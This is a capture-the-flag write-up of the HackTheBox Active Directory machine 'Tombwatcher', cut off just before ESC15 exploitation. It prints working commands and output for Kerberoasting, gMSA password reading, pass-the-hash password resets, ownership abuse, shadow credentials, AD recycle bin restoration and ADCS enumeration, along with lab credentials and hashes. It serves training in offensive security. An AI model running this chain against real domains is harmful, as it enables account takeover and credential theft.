---
title: "HTB - Tombwatcher"
date: 2026-07-13
---

## Overview
Tombwatcher is a medium-rated Windows Active Directory machine that begins with an assumed breach scenario. It showcases the use of BloodHound to map a path to a user, who is able to recover objects from the AD recycle bin. From there, I recover a deleted account that lets me exploit ESC15 to take over the administrator.

> HackTheBox have provided us with credentials, simulating an assumed AD breach scenario:
> 
> User: `henry`
> Pass: `H3nry_987TGV!`

## Recon
### Nmap
```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 10.129.232.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 02:40 +0100
Nmap scan report for 10.129.232.167
Host is up (0.021s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49695/tcp open  unknown
49696/tcp open  unknown
49698/tcp open  unknown
49716/tcp open  unknown
49730/tcp open  unknown
49745/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 112.14 seconds
```

```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -T4 10.129.232.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 02:46 +0100
Nmap scan report for 10.129.232.167
Host is up (0.069s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 05:46:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T05:48:02+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-07-11T05:48:01+00:00; +4h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T05:48:02+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-07-11T05:48:01+00:00; +4h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-11T05:47:23
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.37 seconds
```

Key findings:

- General port structure suggests a Domain Controller (53,88,389).
- IIS Windows Server on port 80 worth enumerating.
- LDAP script scanning finds the hostname is `DC01.tombwatcher.htb`, and the domain is `tombwatcher.htb`.
- Clock skew of 4 hours, meaning I'll need to sync my clock with the DC in order to authenticate via Kerberos (Clock skew of 5 minutes or greater will cause Kerberos to reject tickets).
- I'll want to enumerate SMB/LDAP with provided credentials.

## Web - 80/tcp
I'll start by adding the FQDN (`DC01.tombwatcher.htb`) and domain (`tombwatcher.htb`) to my `/etc/hosts` file.

```sh
┌──(kali㉿kali)-[~]
└─$ echo '10.129.232.167 DC01.tombwatcher.htb tombwatcher.htb' | sudo tee -a /etc/hosts
10.129.232.167 DC01.tombwatcher.htb tombwatcher.htb
```

Browsing to the web server on port 80 returns the default IIS landing page - I'll move onto other services, as it's not a priority.

![IIS](/assets/img/tombwatcher/iis.png)

## SMB - 445/tcp
I'll validate the credentials HTB provided, and enumerate any shares they can access.

```shell
┌──(kali㉿kali)-[~]
└─$ nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions            Remark
SMB         10.129.232.167  445    DC01             -----           -----------            ------
SMB         10.129.232.167  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.232.167  445    DC01             C$                                     Default share
SMB         10.129.232.167  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ                   Logon server share 
```

Nothing jumps out at me, SYSVOL can be checked for GPP passwords, however I'll not find any credentials.
```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' -M gpp_password
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions            Remark
SMB         10.129.232.167  445    DC01             -----           -----------            ------
SMB         10.129.232.167  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.232.167  445    DC01             C$                                     Default share
SMB         10.129.232.167  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ                   Logon server share 
GPP_PASS... 10.129.232.167  445    DC01             [+] Found SYSVOL share
GPP_PASS... 10.129.232.167  445    DC01             [*] Searching for potential XML files containing passwords
```

## BloodHound AD Chain
After enumerating port 80 and validating the AD credentials, I'll enumerate the domain further using `rusthound-ce` to collect the data and `BloodHound` to map out attack paths.

```sh
┌──(kali㉿kali)-[~]
└─$ rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -z                   
---------------------------------------------------
Initializing RustHound-CE at 03:47:11 on 07/11/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-07-11T02:47:11Z INFO  rusthound_ce] Verbosity level: Info
[2026-07-11T02:47:11Z INFO  rusthound_ce] Collection method: All
[2026-07-11T02:47:11Z INFO  rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!
[2026-07-11T02:47:11Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-07-11T02:47:12Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-07-11T02:47:12Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 2%
[2026-07-11T02:47:12Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-07-11T02:47:12Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-07-11T02:47:12Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-07-11T02:47:13Z INFO  rusthound_ce::json::maker::common] .//20260711034713_tombwatcher-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 03:47:13 on 07/11/26! Happy Graphing!
```

After loading BloodHound, I find a path to a domain user named `john`.

![BloodHound](/assets/img/tombwatcher/bloodhound.png)

The chain is the following:

- Kerberoast `alfred`, write an SPN to Alfred using Henry to authenticate, request Alfred's kerberos ticket, and crack it offline.
- Add `alfred` to `infrastructure` - self-add to inherit the group's rights.
- Read `Ansible_dev$` gMSA password - Infrastructure's `ReadGMSAPassword` allows me to retrieve the NT hash of `ansible_dev$`
- Reset `sam`'s password - `ansible_dev$` has `ForceChangePassword` over Sam.
- `WriteOwner` over `john` - Sam takes ownership, then grants itself `GenericAll`.
- Shadow Credentials attack on `john` - `GenericAll` allows me to use `certipy` to add a key credential, then request a TGT via PKINIT and recover John's NT hash.

### Kerberoast Alfred
First, I'll write a SPN to `alfred` using `bloodyad`.

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'tombwatcher/qvq'  
[+] alfred's servicePrincipalName has been updated
```

With a SPN set on `alfred`'s account, I'll request a TGS for `tombwatcher/qvq` using `netexec`. The KDC encrypts the service ticket using alfred's password hash, which I can then crack offline.
```sh
┌──(kali㉿kali)-[~]
└─$ nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoast krb.users  
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.232.167  389    DC01             [*] Total of records returned 1
LDAP        10.129.232.167  389    DC01             [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 16:17:03.526670, lastLogon: <never>
LDAP        10.129.232.167  389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$0d3c82e84f7cb8155e261ed2e2550e5a$e273bc
<SNIP>
```

I'll use `hashcat` to crack the hash offline using mode (`-m`) 13100.
```sh
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 krb.users /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$0d3c82e84f7cb8155e261ed2e2550e5a$e273bcb8b5883M<SNIP>:basketball
</SNIP>
```

#### *Cleanup*
It is good practice to clean up any artefacts left on a system as a result of our testing, whether it be a file, or modification to an object, or anything.

I'll set the SPN to nothing to revert the change I made to `alfred`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName
[+] alfred's servicePrincipalName has been updated
```

### Add Alfred to Infrastructure group
I'll use `bloodyad` to authenticate as `alfred` and abuse `AddSelf` to add `alfred` to the `infrastructure` group.

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember infrastructure alfred
[+] alfred added to infrastructure
```

### Read gMSA password - ansible_dev$
Now that `alfred` is a member of the `infrastructure` group, I inherit the permission to read the gMSA password of `ansible_dev$`.

I'll opt to use `netexec` to complete this action.
```sh
┌──(kali㉿kali)-[~]
└─$ nxc ldap tombwatcher.htb -u alfred -p 'basketball' --gmsa
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: 47f92356b62e2b1c7b185df4842b63ad     PrincipalsAllowedToReadPassword: Infrastructure
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         aes128-cts-hmac-sha1-96: 5830408ace5d9b31236adddbedd1f0a2
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         aes256-cts-hmac-sha1-96: 764bcf6f656767016283fc0bc73a38e85dc310ab48122c47c1d50bd6e68fbe47
```

### Password reset - Sam
I'll perform a Pass the Hash authentication using `bloodyad`, and reset the password of `sam` to further my access in the AD environment.

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'ansible_dev$' -p :47f92356b62e2b1c7b185df4842b63ad set password sam Kappa54@
[+] Password changed successfully!
```

### WriteOwner - John
I'll abuse this outbound control using (once again) `bloodyad`, making `sam` the owner of the user object `john`.

I can see the previous owner was `Domain Admins`, as the RID is `512`, and the new owner is `sam`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'Kappa54@' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

### Shadow Credentials Attack - John
As the owner, I'll grant `sam` `GenericAll` rights over `john`. This gives write access to `john`'s `msDS-KeyCredentialLink` attribute, which Shadow Credentials attack abuses.

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'Kappa54@' add genericAll john sam
[+] sam has now GenericAll on john
```

Next, I use `certipy` to add a key credential and request a TGT, ultimately recovering `john`'s NT hash. `certipy` will restore the old key credentials, cleaning up after itself.
```sh
┌──(kali㉿kali)-[~]
└─$ certipy shadow auto -u sam@tombwatcher.htb -p 'Kappa54@' -account john -dc-ip 10.129.232.167    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '15a64f40ca234fb7af28f042420d300d'
[*] Adding Key Credential with device ID '15a64f40ca234fb7af28f042420d300d' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '15a64f40ca234fb7af28f042420d300d' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```

> Another reminder to always leave the domain in the state you found it. All changes made in the chain above should be reverted once testing is complete.

## User Foothold
During re-enumeration, I'll find `john` is part of the `Remote Management` group, which allows remote access to the domain controller.

Validation with `netexec`:
```sh
┌──(kali㉿kali)-[~]
└─$ nxc winrm tombwatcher.htb -u 'john' -H 'ad9324754583e3e42b55aad4d3b8d2bf'
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.129.232.167  5985   DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf (Pwn3d!)
```

### User Flag
Connecting over `winrm` using `evil-winrm`, and collecting the user flag.

```sh
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i tombwatcher.htb -u 'john' -H 'ad9324754583e3e42b55aad4d3b8d2bf'

*Evil-WinRM* PS C:\Users\john\Documents> cd C:\Users\john\Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/12/2026   5:20 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
<REDACTED_FLAG>
```

## Privilege Escalation
With nothing of interest in the user files, I shift my focus to the ADCS configuration.

### ADCS Enumeration
I'll use `certipy` to enumerate the templates and find an interesting template `WebServer`.

```sh
┌──(kali㉿kali)-[~]
└─$ certipy find -u john@tombwatcher.htb -hashes ':ad9324754583e3e42b55aad4d3b8d2bf' -dc-ip 10.129.232.167 -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Templates
<SNIP>
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00         
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

There is an object not being parsed correctly, so it outputs the SID. At the end of the SID, I'll find the RID is `1111` which is likely to be a user.

Querying the SID reveals that no object is found:
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' get object 'S-1-5-21-1392491010-1358638721-2126982587-1111'
Traceback (most recent call last):
<SNIP>
bloodyAD.exceptions.NoResultError: No object found in DC=tombwatcher,DC=htb with filter: (objectSid=S-1-5-21-1392491010-1358638721-2126982587-1111)
```

This leads me to believe it has been previously deleted. I'll shift my focus to the `AD Recycle Bin`.

### AD Recycle Bin
I'll use `bloodyAD` once again to enumerate deleted objects, using the LDAP control ending in `417` (`show deleted objects`).

>For a fuller sweep, including recycled and tombstoned objects, you can add the controls ending in `2064` (show recycled) and `2065` (show deactivated links).

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' get search -c 1.2.840.113556.1.4.417 --base 'CN=Deleted Objects,DC=tombwatcher,DC=htb' --attr distinguishedName,isDeleted,lastKnownParent,objectSid

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
isDeleted: True

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
isDeleted: True
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
isDeleted: True
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1110

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
isDeleted: True
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111
```

The last entry from the output shows the SID (`1111`) from the `certipy` output, with the object name `cert_admin` and its last known parent being the ADCS OU.

### Restore AD Object - cert_admin
I'll restore using `bloodyAD`, targeting the object by its full distinguished name. The GUID embedded in the distinguished name uniquely identifies the `1111` instance I want.

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' set restore 'CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'
[+] CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb

┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' get writable 

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

With `WRITE` permissions over the `ADCS` OU, I'll have inherited permissions to be able to reset the password for `cert_admin`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' set password cert_admin 'Kappa54@'
[+] Password changed successfully!
```

### ADCS Enumeration 2
As always, with a new user I'll look to re-enumerate ADCS. I'll tweak my original `certipy` command syntax slightly by adding `-vuln` to only output vulnerable templates.

```sh
┌──(kali㉿kali)-[~]
└─$ certipy find -u cert_admin@tombwatcher.htb -p 'Kappa54@' -dc-ip 10.129.232.167 -vuln -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

Here, I see two potential ESC vulnerabilities, `ESC15` and `ESC17`. I'll attempt to exploit `ESC15` first.

### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
Looking at the `certipy` [wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Scenario B appears to be my route, since the template's EKU is set to `Server Authentication`.

